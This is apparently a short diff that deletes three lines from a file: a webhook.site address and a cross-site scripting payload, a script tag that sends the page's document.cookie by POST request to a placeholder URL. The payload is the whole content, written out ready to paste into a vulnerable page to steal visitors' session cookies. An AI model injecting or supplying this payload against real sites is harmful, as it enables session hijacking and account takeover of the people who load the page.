@@ -1,3 +1,0 @@
-https://webhook.site
-
-<script>var http=new XMLHttpRequest; http.open("POST", "URL HERE"); http.send(document.cookie)</script>
